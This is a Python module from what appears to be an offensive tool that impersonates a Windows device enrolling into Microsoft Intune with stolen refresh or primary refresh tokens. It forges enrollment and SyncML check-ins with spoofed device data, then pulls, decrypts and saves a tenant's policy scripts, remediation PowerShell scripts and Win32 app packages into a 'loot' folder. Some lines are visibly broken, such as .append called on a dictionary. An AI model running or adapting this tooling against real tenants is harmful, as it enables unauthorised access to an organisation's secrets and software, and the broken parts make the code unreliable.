import os
import io
import jwt
import base64
import gzip
import struct
import requests
import uuid
import json
import xmltodict
import xml.etree.ElementTree as ET
from datetime import datetime, timedelta, timezone
from device.device import Device
from utils.utils import prtauth, extract_pfx, save_encrypted_message_as_smime, decrypt_smime_file, aes_decrypt, renew_token, write_file
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.serialization import Encoding

outdir = os.path.join(os.getcwd(), 'loot')

class Windows(Device):
    def __init__(self, logger, os, device_name, deviceid, uid, tenant, prt, session_key, proxy):
        super().__init__(logger, os, device_name, deviceid, uid, tenant, prt, session_key, proxy)
        self.os_version = '10.0.19045.2006'
        self.ssp_version = self.os_version
        self.checkin_url = 'https://r.manage.microsoft.com/devicegatewayproxy/cimhandler.ashx'        
        self.provider_name = 'WindowsEnrollment'
        self.cname = 'ConfigMgrEnroll'
    
    def get_enrollment_token(self, refresh_token):
        if self.prt:
            access_token, _ = prtauth(
                self.prt, 
                self.session_key, 
                '29d9ed98-a469-4536-ade2-f981bc1d605e', 
                'https://enrollment.manage.microsoft.com/', 
                'ms-aadj-redir://auth/mdm', 
                self.proxy
                )
        else:
            access_token, _ = renew_token(
                refresh_token, 
                '9ba1a5c7-f17a-4de9-a1f1-6178c8d51223', 
                'openid offline_access profile d4ebce55-015a-49b5-a083-c84d1797ae8c/.default', 
                self.proxy
            )
        return access_token

    def replace_string(self, flag, keyword, str, replace_str):  
        if flag:
            str = str.replace(keyword, replace_str)
        else:
            str = str.replace(keyword, '')
        return str

    def create_device_enrollment_soap_request(self, enrollment_url, token_b64, csr_pem, ContextItem):
        # While ZEEP Could be used, at this stage it has been a headache, so I am skipping it for now and just crafting the XML myself, it's somewhat better than it was hardcoded before. 
        xmlnamespaces = {
            'xmlns:s':"http://www.w3.org/2003/05/soap-envelope",
            'xmlns:a':"http://www.w3.org/2005/08/addressing",
            'xmlns:u':"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd",
            'xmlns:wsse':"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd",
            'xmlns:wst':"http://docs.oasis-open.org/ws-sx/ws-trust/200512",
            'xmlns:ac':"http://schemas.xmlsoap.org/ws/2006/12/authorization"
        }

        # Create the primary envelope
        soap_envelope = ET.Element("s:Envelope", xmlnamespaces)

        # Create our Soap Headers
        action = {
            "tag": "a:Action",
            "attribute": 's:mustUnderstand="1"',
            "value": "http://schemas.microsoft.com/windows/pki/2009/01/enrollment/RST/wstep"
            }

        MessageID = {
            "tag": "a:MessageID",
            "value": f"urn:uuid:{str(uuid.uuid4())}"
            }

        ReplyTo = {
            "tag": "a:ReplyTo",
            'value': {
                "tag": "a:Address",
                "value": "http://www.w3.org/2005/08/addressing/anonymous"
                }
            }

        to = {
            "tag": "a:To",
            "attribute": 's:mustUnderstand="1"',
            "value": f"{enrollment_url}"
            }

        BinarySecurityToken = {
            "tag": "wsse:BinarySecurityToken",
            # [MS-DVRE] - v20180912 page 17/37 shows ValueType and EncodingType as static for this token
            "attribute": f'ValueType="urn:ietf:params:oauth:token-type:jwt" EncodingType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd#base64binary"',
            "value": f"{token_b64}"
            }

        security = {
            "tag": "wsse:Security",
            "attribute": 's:mustUnderstand="1"',
            "value": BinarySecurityToken
            }

        soap_header = ET.Element("s:Header")

        for i in [action] + [MessageID] + [ReplyTo] + [to] + [security]:
            tag = i["tag"]
            attribute = i.get("attribute", None)
            attributes = {}
            if (attribute is not None) and ('=' in attribute):
                for part in attribute.split(' '):
                    if '=' in part:
                        key, val = part.split('=')
                        attributes[key] = val.strip('"')
            value = i["value"]
            if isinstance(value, dict):
                temp_element = ET.Element(tag, attrib=attributes)

                #sub_element = ET.SubElement(soap_header, tag, attrib={} if not attribute else {attribute.split('=')[0]: attribute.split('=')[1].strip('"')})
                sub_tag = value["tag"]
                sub_attribute = value.get("attribute", None)
                sub_attributes = {}
                if (sub_attribute is not None) and ('=' in sub_attribute):
                    for part in sub_attribute.split(' '):
                            if '=' in part:
                                key, val = part.split('=')
                                sub_attribute = f'{key}={val.strip("\"")}'
                                sub_attributes[key] = val.strip('"')

                sub_value = value["value"]

                ET.SubElement(temp_element, sub_tag, attrib={} if not sub_attribute else sub_attributes).text = sub_value
                soap_header.append(temp_element)
            else:
                ET.SubElement(soap_header, tag, attrib={} if not attribute else attributes).text = value

        # Append our final Header to the Soap Envelope
        soap_envelope.append(soap_header)

        # Create our Soap Body
        TokenType = {
            "tag" : "wst:TokenType",
            "value" : "http://schemas.microsoft.com/5.0.0.0/ConfigurationManager/Enrollment/DeviceEnrollmentToken"
            }

        requestType = {
            "tag" : "wst:RequestType",
            # The value here is the Issuer request, according to https://specterops.io/blog/2025/07/30/entra-connect-attacker-tradecraft-part-3/, you are able to modify this to Recovery and create a new MDM cert without issuing a new certificate
            # The information for this type can be found in https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mde2/
            "value" : "http://docs.oasis-open.org/ws-sx/ws-trust/200512/Issue"
            }

        BinarySecurityToken = {
            "tag" : "wsse:BinarySecurityToken",
            "attribute" : 'ValueType="http://schemas.microsoft.com/windows/pki/2009/01/enrollment#PKCS10" EncodingType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd#base64binary"',
            "value" : f"{csr_pem}"
            }

        body = ET.Element("s:Body")
        RequestSecurityToken = ET.Element("wst:RequestSecurityToken")

        for i in [TokenType, requestType, BinarySecurityToken]:
            tag = i["tag"]
            attribute = i.get("attribute", None)
            attributes = {}
            if (attribute is not None) and ('=' in attribute):
                for part in attribute.split(' '):
                    if '=' in part:
                        key, val = part.split('=')
                        attributes[key] = val.strip('"')
            value = i["value"]
            ET.SubElement(RequestSecurityToken, tag, attrib=attributes).text = value

        # Create AdditionalContext Attribute with all keys/values from ContextItem
        AdditionalContext = {
            "tag" : "ac:AdditionalContext",
            "attribute" : 'xmlns="http://schemas.xmlsoap.org/ws/2006/12/authorization"'
        }

        AdditionalContextItems = ET.Element("ac:AdditionalContext", {"xmlns": "http://schemas.xmlsoap.org/ws/2006/12/authorization"})

        for key, val in ContextItem.items():
            context_item = ET.SubElement(AdditionalContextItems, "ac:ContextItem", attrib={"Name": key})
            ET.SubElement(context_item, "ac:Value").text = str(val)
        
        # Append AdditionalContext to RequestSecurityToken then RequestSecurityToken to Body
        RequestSecurityToken.append(AdditionalContextItems)
        body.append(RequestSecurityToken)

        # Append our final Body to the Soap Envelope
        soap_envelope.append(body)
        
        # Print out the final XML
        #ET.dump(soap_envelope)

        return ET.tostring(soap_envelope, encoding='utf-8').decode('utf-8')

    def send_enroll_request(self, enrollment_url, csr_pem, csr_token, ztdregistrationid,  is_device, is_hejd):
        deviceid = None
        if self.deviceid:
            deviceid = self.deviceid.replace('-', '')

        token_b64 = base64.b64encode(csr_token.encode('utf-8')).decode('utf-8')
        # New testing for enrollment request to use an XML build instead of hardcoded string
        context_items = {
            "ApplicationVersion":f"{self.os_version}",
            "AzVMIAMExtensionJoin":f":{is_device}",
            "BootstrapDomainJoin":"true",
            "DeviceID":f"{deviceid}",
            "DeviceName":f"{self.device_name}",
            "DeviceType":"CIMClient_Windows",
            "EnrollmentData":"null",
            "EnrollmentType":"Device",
            "HWDevID":"0000000000000000000000000000000000000000000000000000000000000000",
            "Locale":"en-US",
            "MAC":"00-00-00-00-00-00",
            "NotInOobe":"false",
            "OSEdition":"72",
            "OSVersion":f"{self.os_version}",
            "TargetedUserLoggedIn":"false",
            "UXInitiated":"true",
        }

        if (not self.deviceid):
            context_items.append({"OfflineAutoPilotEnrollmentCorrelator":"12345678-1E13-45F3-BF82-A3E8C5B59EAC"})
        if ztdregistrationid:
            context_items.append({"ZeroTouchProvisioning":f"{ztdregistrationid}"})
        if is_hejd:
            context_items.append({"DomainName":"evil.local"})

        body = self.create_device_enrollment_soap_request(enrollment_url, token_b64, csr_pem, context_items)

        # Send POST Request to Enrollment URL
        response = requests.post(
            url=enrollment_url,
            data=body,
            headers={"Content-Type": "application/soap+xml; charset=utf-8"},
            proxies=self.proxy,
            verify=False
        )

        # Response Parsing
        self.logger.debug(f'received response for enrollment request:\n{response.content.decode()}')
        xml = ET.fromstring(response.content.decode('utf-8'))

        #print(xml)

        binary_security_token = xml.find('.//{http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd}BinarySecurityToken').text

        return base64.b64decode(binary_security_token).decode('utf-8')

    def generate_initial_syncml(self, sessionid, imei):
        syncml_data = self.generate_syncml_header(1, sessionid, imei)

        syncml_data["SyncML"]["SyncBody"] = { 
            "Alert": [],
            "Replace": {
                "CmdID": "6",
                "Item": [
                    {
                        "Source": {"LocURI": "./DevInfo/DevId"},
                        "Data": f"imei:{imei}",
                    },
                    {
                        "Source": {"LocURI": "./DevInfo/Man"}, 
                        "Data": self.get_syncml_data("./DevInfo/Man")["Data"]
                    },
                    {
                        "Source": {"LocURI": "./DevInfo/Mod"},
                        "Data": self.get_syncml_data("./DevInfo/Mod")["Data"] 
                    },
                    {
                        "Source": {"LocURI": "./DevInfo/DmV"}, 
                        "Data": self.get_syncml_data("./DevInfo/DmV")["Data"] 
                    },
                    {
                        "Source": {"LocURI": "./DevInfo/Lang"}, 
                        "Data": self.get_syncml_data("./DevInfo/Lang")["Data"] 
                    }
                ],
            },
            "Final": None
            }          

        if self.hwhash:
                syncml_data["SyncML"]["SyncBody"]["Alert"] = [
                    {"CmdID": "2", "Data": "1201"},
                    {"CmdID": "3", "Data": "1224", "Item": {"Meta": {"Type": {"@xmlns": "syncml:metinf", "#text": "com.microsoft/MDM/LoginStatus"}},"Data": {"@xmlns": "SYNCML:SYNCML1.2", "#text":"others"}}},
                    {"CmdID": "4", "Data": "1224", "Item": {"Meta": {"Type": {"@xmlns": "syncml:metinf", "#text": "com.microsoft/MDM/BootstrapSync"}},"Data": {"@xmlns": "SYNCML:SYNCML1.2", "#text":"device"}}},
                    {"CmdID": "5", "Data": "1224", "Item": {"Meta": {"Type": {"@xmlns": "syncml:metinf", "#text": "com.microsoft/MDM/OdjSync"}},"Data": {"@xmlns": "SYNCML:SYNCML1.2", "#text":"device"}}}]

        return xmltodict.unparse(syncml_data, pretty=False)

    def get_syncml_data(self, key):
        offset = timedelta(hours=9)
        now = datetime.now()
        jst = timezone(offset)
        dt_with_tz = now.astimezone(jst)
        formatted_date = dt_with_tz.isoformat()

        # This JSON DATA is used for the Checkin to verify compliance
        # https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-devicelock


        # This acts as a set of static responses we can use to reply, the idea is that some data from this is just static and doesn't need to be dynamic. 
        static_responses_path = os.path.join(os.path.dirname(__file__), 'windows_syncml_static_responses.json')
        with open(static_responses_path, 'r', encoding='utf-8') as f:
            static_responses_raw = json.load(f)

        responses = {
            key: value[0] for key, 
            value in static_responses_raw.items()
        }

        # These responses need to be dynamic as they can change.
        dynamic_responses = {
            f"./Vendor/MSFT/DMClient/Provider/MS%20DM%20Server/ExchangeID": {
                "Format": "chr",
                "Data": self.uid
            },
            f"./DevDetail/Ext/Microsoft/LocalTime": {
                "Format": "chr",
                "Data": formatted_date
            },
            f"./Device/DevDetail/Ext/Microsoft/LocalTime": {
                "Format": "chr",
                "Data": formatted_date
            },
            f"./DevDetail/Ext/Microsoft/DeviceName": {
                "Format": "chr",
                "Data": self.device_name
            },
            f"./Device/DevDetail/SwV": {
                "Format": "chr",
                "Data": self.os_version
            },
            f"./DevDetail/SwV": {
                "Format": "chr",
                "Data": self.os_version
            },
            f"./Vendor/MSFT/Update/LastSuccessfulScanTime": {
                "Format": "chr",
                "Data": formatted_date
            },
            f"./Vendor/MSFT/DMClient/Provider/MS%20DM%20Server/EntDMID": {
                "Format": "chr",
                "Data": self.deviceid
            },
            f"./Device/Vendor/MSFT/DeviceInformation/Version": {
                "Format": "chr",
                "Data": self.os_version
            },
            f"./DevDetail/Ext/Microsoft/DNSComputerName": {
                "Format": "chr",
                "Data": self.device_name
            },
            f"./Vendor/MSFT/DMClient/Provider/MS%20DM%20Server/EntDeviceName": {
                "Format": "chr",
                "Data": self.device_name
            },
            f"./DevDetail/Ext/DeviceHardwareData": {
                "Format":"chr",
                "Data":self.hwhash
            },
        }

        responses.update(dynamic_responses)

        if key in responses:
            #print(f'Data Found: {key}:{data[key]}')
            return responses[key]
        else:
            return None

    def send_syncml(self, data, certpath, keypath):
        response = requests.post(
            url=self.checkin_url,
            data=data,
            headers={
                'User-Agent': f'MSFT {self.os} OMA DM Client/2.7' , 'Content-Type': 'application/vnd.syncml.dm+xml',
                },
            cert=(certpath, keypath)
            )
        return response.content

    def download_apps(self, mdmpfx):
        # Verify if the current self contains mdm_certpath or mdm_keypath, if we do, this means we are using the device config insted of the supplied PFX
        if hasattr(self, 'mdm_certpath') and hasattr(self, 'mdm_keypath'):
            self.logger.debug(f'Using MDM cert and key from device config for checkin')
            certpath = self.mdm_certpath
            keypath = self.mdm_keypath
        elif hasattr(self, 'mdm_pfxpath'):
            # In the impossible case we have the mdm_pfxpath set instead, extract from there
            self.logger.debug(f'Using MDM PFX from device config for checkin')
            filepath = os.path.join('device_config', self.device_name)
            certpath = os.path.join(filepath, f'{self.device_name}_mdm_cert.pem')
            keypath = os.path.join(filepath, f'{self.device_name}_mdm_key.key')
            extract_pfx(self.mdm_pfxpath, certpath, keypath)
        else:
            # If we do not have the attribute set, use the supplied PFX to generate the cert and key
            self.logger.debug(f'Using supplied MDM PFX for checkin')
            certpath = f'{self.device_name}_mdm_cert.pem'
            keypath = f'{self.device_name}_mdm_key.key'
            extract_pfx(mdmpfx, certpath, keypath)

        ime = IME(self.device_name, certpath, keypath)
        self.logger.info(f'Downloading scripts...')
        policies = ime.request_policy()
        
        if len(policies) == 0:
            self.logger.error(f'Available scripts not found')
        else:
            self.logger.alert(f'Scripts found!')
            i = 1
            for policy in policies:
                i += 1
                policyID = policy["PolicyId"]
                policyBody = (policy["PolicyBody"])
                encryptedPolicyBody = policy['EncryptedPolicyBody']

                self.logger.info(f'#{i} (Policy ID:{policyID}):\n')

                if policy["EncryptedPolicyBody"]:
                    decrypted = ime.decrypt_encrypted_policy_body(encryptedPolicyBody)
                    write_file(filepath=os.path.join(outdir, "app_scripts"), filename=f'policy_script_{policyID}_decrypted.txt', content=decrypted)
                    print(decrypted + '\n')
                if policy["PolicyBody"]:
                    print(policyBody + '\n')
                    write_file(filepath=os.path.join(outdir, "app_scripts"), filename=f'policy_script_{policyID}.txt', content=policyBody)


        self.logger.info(f'Downloading win32apps...')

        # Get Selected Apps
        apps = ime.get_selected_app()
        apps2 = ime.get_request_application()

        for app in apps2:
            if app not in apps:
                apps.append(app)
        
        if len(apps) == 0:
            self.logger.error(f'Available intunewin file not found')
        for app in apps:
            app_name = app['Name']
            InstallCommandLine = app['InstallCommandLine']
            UninstallCommandLine = app['UninstallCommandLine']
            DetectionRule = app['DetectionRule']
            ExtendedRequirementRules = app['ExtendedRequirementRules']
        
            content_info = ime.get_content_info(app)
            upload_location = json.loads(content_info["ContentInfo"])["UploadLocation"]
            decrypt_info = ime.decrypt_decryptinfo(content_info["DecryptInfo"])

            write_file(filepath=os.path.join(outdir, "apps_intunewin"), filename=f'{app_name}_info.json', content=json.dumps(app))

            self.logger.alert(f'Found {app_name}, downloading...')
            self.logger.debug(f'Downloading: {upload_location} ...')

            ime.download_intunewin(app_name, upload_location, decrypt_info)
            self.logger.success(f'Successfully downloaded {app_name}.intunewin!')

        # If we have the MDM Certpath and keypath, we do not want to remove the files
        if hasattr(self, 'mdm_certpath') and hasattr(self, 'mdm_keypath'):
            self.logger.debug(f'Using existing MDM cert and key files, not removing them...')
            return
        else:
            self.logger.debug(f'Removing temporary MDM cert and key files...')
            os.remove(certpath)
            os.remove(keypath)
            return

    def download_remediation_scripts(self, mdmpfx):
        # Verify if the current self contains mdm_certpath or mdm_keypath, if we do, this means we are using the device config insted of the supplied PFX
        if hasattr(self, 'mdm_certpath') and hasattr(self, 'mdm_keypath'):
            self.logger.debug(f'Using MDM cert and key from device config for checkin')
            certpath = self.mdm_certpath
            keypath = self.mdm_keypath
        elif hasattr(self, 'mdm_pfxpath'):
            # In the impossible case we have the mdm_pfxpath set instead, extract from there
            self.logger.debug(f'Using MDM PFX from device config for checkin')
            filepath = os.path.join('device_config', self.device_name)
            certpath = os.path.join(filepath, f'{self.device_name}_mdm_cert.pem')
            keypath = os.path.join(filepath, f'{self.device_name}_mdm_key.key')
            extract_pfx(self.mdm_pfxpath, certpath, keypath)
        else:
            # If we do not have the attribute set, use the supplied PFX to generate the cert and key
            self.logger.debug(f'Using supplied MDM PFX for checkin')
            certpath = f'{self.device_name}_mdm_cert.pem'
            keypath = f'{self.device_name}_mdm_key.key'
            extract_pfx(mdmpfx, certpath, keypath)

        ime = IME(self.device_name, certpath, keypath)

        self.logger.info(f'Downloading remediation scripts...')
        scripts = ime.get_remediation_scripts()
        if len(scripts) == 0:
            self.logger.error(f'Available remediation scripts not found')
        else:
            self.logger.alert(f'Remediation scripts found!')
            i = 1
            for script in scripts:
                policyID = script["PolicyId"]
                policyParameters = script["PolicyScriptParameters"]
                policyBody = base64.b64decode(script["PolicyBody"]).decode('utf-8')
                remediationParameters = script["RemediationScriptParameters"]
                remediationBody = base64.b64decode(script["RemediationScript"]).decode('utf-8')

                self.logger.info(f'#{i} (Remediation/Policy ID:{policyID}):\n')
                print(f"Detection Script Parameters:\n{policyParameters}")
                print(f"Detection Script:\n{policyBody}")
                print(f"Remediation Script Parameters:\n{remediationParameters}")
                print(f"Remediation Script:\n{remediationBody}")

                write_file(filepath=os.path.join(outdir, "remediation_scripts"), filename=f'{policyID}_detection_script.ps1', content=policyBody)
                write_file(filepath=os.path.join(outdir, "remediation_scripts"), filename=f'{policyID}_remediation_script.ps1', content=remediationBody)

                if remediationParameters != "":
                    write_file(filepath=os.path.join(outdir, "remediation_scripts"), filename=f'{policyID}_remediation_script_parameters.txt', content=json.dumps(remediationParameters, indent=4))
                if policyParameters != "":
                    write_file(filepath=os.path.join(outdir, "remediation_scripts"), filename=f'{policyID}_detection_script_parameters.txt', content=json.dumps(policyParameters, indent=4))
                i += 1

        # If we have the MDM Certpath and keypath, we do not want to remove the files
        if hasattr(self, 'mdm_certpath') and hasattr(self, 'mdm_keypath'):
            self.logger.debug(f'Using existing MDM cert and key files, not removing them...')
            return
        else:
            self.logger.debug(f'Removing temporary MDM cert and key files...')
            os.remove(certpath)
            os.remove(keypath)
            return

    def test(self, mdmpfx):
        # Verify if the current self contains mdm_certpath or mdm_keypath, if we do, this means we are using the device config insted of the supplied PFX
        if hasattr(self, 'mdm_certpath') and hasattr(self, 'mdm_keypath'):
            self.logger.debug(f'Using MDM cert and key from device config for checkin')
            certpath = self.mdm_certpath
            keypath = self.mdm_keypath
        elif hasattr(self, 'mdm_pfxpath'):
            # In the impossible case we have the mdm_pfxpath set instead, extract from there
            self.logger.debug(f'Using MDM PFX from device config for checkin')
            filepath = os.path.join('device_config', self.device_name)
            certpath = os.path.join(filepath, f'{self.device_name}_mdm_cert.pem')
            keypath = os.path.join(filepath, f'{self.device_name}_mdm_key.key')
            extract_pfx(self.mdm_pfxpath, certpath, keypath)
        else:
            # If we do not have the attribute set, use the supplied PFX to generate the cert and key
            self.logger.debug(f'Using supplied MDM PFX for checkin')
            certpath = f'{self.device_name}_mdm_cert.pem'
            keypath = f'{self.device_name}_mdm_key.key'
            extract_pfx(mdmpfx, certpath, keypath)

        ime = IME(self.device_name, certpath, keypath)

        scripts = ime.request_all()

class IME():
    def __init__(self, device_name, certpath, keypath):
        self.device_name = device_name
        self.certpath = certpath
        self.keypath = keypath

    def make_gateway_api_request(self, gateway_api, request_payload=None):
        sidecar_url = self.resolve_service_address()
        sessionid = str(uuid.uuid4())
        data = self.create_request_data(sessionid, gateway_api, request_payload)

        headers = {
            'Content-Type': 'application/json',
            'Prefer': 'return-content'
        }

        response = requests.put(
            url=f'{sidecar_url}/SideCarGatewaySessions(\'{sessionid}\')?api-version=1.5',
            cert=(self.certpath, self.keypath),
            data=json.dumps(data),
            headers=headers,
        )

        response_json = response.json()
        """
        Structure of JSON Response
        {
            "odata.metadata": "",
            "odata.id": "",
            "Key": "",
            "SessionId": "",
            "RequestContentType": "RequestApplication",
            "RequestPayload": "",
            "ResponseContentType": "PolicyResponse",
            "ResponsePayload": "",
            "ClientInfo": "",
            "EnabledFlights": "DisableWin32V2AppProcessor",
            "CheckinIntervalMinutes": 56,
            "CheckinReason": "AgentRestart",
            "CheckinReasonPayload": null,
            "GenericWorkloadRequests": null,
            "GenericWorkloadResponse": null
        }
        """

        # I am abusing the typing here so we can do a selected response type for the payload when decompressing instead of hardcoding the decompression at the end of the request
        if (response_json.get("RequestContentType") == "RequestApplication" or response_json.get("RequestContentType") == "GetSelectedApp"):
            json_payload = response_json['ResponsePayload']
            json_payload = (self.decompress_string(json_payload))
        else:
            json_payload = response_json['ResponsePayload']

        return json_payload

    # Requests
    def create_request_data(self, sessionid, gateway_api, request_payload=None):
        if request_payload == None:
            request_payload_str = "[]"
        else:
            request_payload_str = json.dumps(request_payload)

        data = {
            "Key": sessionid,
            "SessionId": sessionid,
            "RequestContentType": gateway_api,
            "RequestPayload": request_payload_str,
            "ResponseContentType": None,
            "ClientInfo": json.dumps({
                "DeviceName": self.device_name,
                "OperatingSystemVersion": "10.0.19045",
                "SideCarAgentVersion": "1.83.107.0",
                "Win10SMode": False,
                "UnlockWin10SModeTenantId": None,
                "UnlockWin10SModeDeviceId": None,
                "ChannelUriInformation": None,
                "AgentExecutionStartTime": "10/11/2024 23:15:42",
                "AgentExecutionEndTime": "10/11/2024 23:15:38",
                "AgentCrashSeen": True,
                "ExtendedInventoryMap": {
                    "OperatingSystemRevisionNumber": "2006",
                    "SKU": "72",
                    "DotNetFrameworkReleaseValue": "528372"
                }
            }),
            "ResponsePayload": None,
            "EnabledFlights": None,
            "CheckinIntervalMinutes": None,
            "GenericWorkloadRequests": None,
            "GenericWorkloadResponse": None,
            # CheckinReason can be 
            # - Unknown,
		    # - UserLogOn,
		    # - MaintenanceTimer,
		    # - Notification,
		    # - AgentRestart,
		    # - APV2,
		    # - OnDemand,
		    # - ESP
            "CheckinReason": "AgentRestart",
            "CheckinReasonPayload": None
        }
        return data

    def resolve_service_address(self):
        # This acts as a simple cache so we don't need to keep calling to the same API endpoint multiple times
        if (hasattr(self, 'spn_SideCarGatewayService')):
            #print('Service principal endpoints already resolved, skipping...')
            return self.spn_SideCarGatewayService
        else:
            #print('Resolving service principal endpoints...')
            response = requests.get(
                url='https://manage.microsoft.com/RestUserAuthLocationService/RestUserAuthLocationService/Certificate/ServiceAddresses',
                cert=(self.certpath, self.keypath),
                )

            services = response.json()[0]["Services"]
            sidecar_url = None
            for service in services:
                if service['ServiceName'] == 'SideCarGatewayService':
                    sidecar_url = service['Url']
            setattr(self, 'spn_SideCarGatewayService', sidecar_url)
            return self.spn_SideCarGatewayService

    # Utils
    def decrypt_decryptinfo(self, decryptinfo):
        start = decryptinfo.find('<EncryptedContent>') + len('<EncryptedContent>')
        end = decryptinfo.find('</EncryptedContent>')
        encrypted_content = decryptinfo[start:end].strip()
        smime_file = 'smime.p7m'
        #print(encrypted_content)
        save_encrypted_message_as_smime(encrypted_content, smime_file)
        decrypted_content = decrypt_smime_file(smime_file, self.keypath)
        #print(decrypted_content)
        decrypt_info = json.loads(decrypted_content)
        os.remove(smime_file)
        return decrypt_info

    def decrypt_encrypted_policy_body(self, encryptedPolicyBody):
        start = encryptedPolicyBody.find('<EncryptedContent>') + len('<EncryptedContent>')
        end = encryptedPolicyBody.find('</EncryptedContent>')
        encrypted_content = encryptedPolicyBody[start:end].strip()
        smime_file = 'smime.p7m'
        save_encrypted_message_as_smime(encrypted_content, smime_file)
        decrypted_content = decrypt_smime_file(smime_file, self.keypath)
        os.remove(smime_file)
        return decrypted_content

    def decompress_string(self, compressed_text):
        buffer = base64.b64decode(compressed_text)
        data_length = struct.unpack('I', buffer[:4])[0]        
        memory_stream = io.BytesIO(buffer[4:])
        
        with gzip.GzipFile(fileobj=memory_stream, mode='rb') as gzip_stream:
            decompressed_data = gzip_stream.read(data_length)
        
        return decompressed_data.decode('utf-8')

    # Abstracted Requests
    def request_policy(self):
        response_payload = self.make_gateway_api_request(gateway_api = "PolicyRequest")
        return json.loads(response_payload)

    def get_selected_app(self):
        response_payload = self.make_gateway_api_request(gateway_api = "GetSelectedApp")
        return json.loads(response_payload)
    
    def get_remediation_scripts(self):
        response_payload = self.make_gateway_api_request(gateway_api = "GetScript")
        return json.loads(response_payload)

    def get_content_info(self, assigned_app):
        with open(self.certpath, 'rb') as pem_file:
            pem_data = pem_file.read()

        cert = x509.load_pem_x509_certificate(pem_data, default_backend())
        cert_base64 = base64.b64encode(cert.public_bytes(Encoding.DER)).decode('utf-8')

        request_payload = {
                "ApplicationId": assigned_app['Id'],
                "ApplicationVersion": assigned_app["Version"],
                "Intent": assigned_app["Intent"],
                "CertificateBlob": cert_base64,
                "ContentInfo": None,
                "SecondaryContentInfo": None,
                "DecryptInfo": None,
                "UploadLocation": None,
                "TargetingMethod": 0,
                "ErrorCode": None,
                "TargetType": 2,
                "InstallContext": 2,
                "EspPhase": 2,
                "ApplicationName": assigned_app['Name'],
                "AssignmentFilterIds": None,
                "ManagedInstallerStatus": 1,
                "ApplicationEnforcement": 0
            }

        response_payload = self.make_gateway_api_request(gateway_api = "GetContentInfo", request_payload=request_payload)

        return json.loads(response_payload)

    def download_intunewin(self, appname, upload_location, decrypt_info):
        # Note to self, this is a standard request
        response = requests.get(url=upload_location)

        if decrypt_info['ProfileIdentifier'] == 'NoEncryption':
            # No encryption
            data = response.content
        else:
            # Encrypted
            key = decrypt_info["EncryptionKey"]
            iv = decrypt_info['IV']
            data = aes_decrypt(key, iv, response.content[48:])
        
        write_file(filepath=os.path.join(outdir, "apps_intunewin"), filename=f'{appname}.intunewin', content=data)

    def get_request_application(self):
        # RequestApplication is another call to the Sidecar API to get applications, based on the debug responses;
        # "RequestApplication" is "Requesting required apps" 
        # "GetAvailableApp" which is "Requesting available apps only"
        # "GetSelectedApp", which is "Requesting selected apps for ESP"         
        response_payload = self.make_gateway_api_request(gateway_api = "RequestApplication")
        return json.loads(response_payload)

    def request_all(self):
        # This is a test function to verify if there are any other ways I can use different sidecar requests
        sidecar_apis = [
            #'ApplicationInventory',
            #'DeviceQueryResult',
            #'GenericPolicyResponse',
            #'GetAppProvisioning',
            #'GetAvailableApp',
            #'GetBrand',
            #'GetContentInfo',
            #'GetDeviceProvisioningScripts',
            #'GetFlightingTags'
            #'GetMockApp',
            #'GetProvisioningContentInfo',
            #'GetScript',
            'GetSelectedApp',
            #'GetSideCarGenericPolicies',
            #'GetWin10SUnlockTokenAndPolicy',
            #'GetWin10SUnlockTokenAndPolicyReport',
            #'GetWinUnlockTokenAndPolicy',
            #'PolicyRequest',
            #'PolicyResult',
            #'ReportDeviceProvisioningScriptResults',
            'RequestApplication',
            #'Win32AppResult',
        ]

        sidecar_url = self.resolve_service_address()
        if sidecar_url == None:
            self.logger.error(f'SidecCarGatewayService not found')
            return

        for i in sidecar_apis:
            print(f'Requesting {i} ...')
            sessionid = str(uuid.uuid4())
            data = self.create_request_data(sessionid, i)
            headers = {
                'Content-Type': 'application/json',
                'Prefer': 'return-content'
            }

            response = requests.put(
                url=f'{sidecar_url}/SideCarGatewaySessions(\'{sessionid}\')?api-version=1.5',
                cert=(self.certpath, self.keypath),
                data=json.dumps(data),
                headers=headers,
            )

            response_json = response.json()
            if response_json.get("RequestContentType") == "RequestApplication" or response_json.get("RequestContentType") == "GetSelectedApp":
                #print('Decompressing')

                json_payload = response_json['ResponsePayload']
                decompressed_string = json.loads(self.decompress_string(json_payload))
                for i in decompressed_string:
                    for key in i:
                        print(f' - {key}: {i[key]}')
                    #print(f' - {i["Name"]} (ID: {i["Id"]})')

                #print(json.dumps(decompressed_string, indent=4))

            #print(json.dumps(response_json, indent=4))
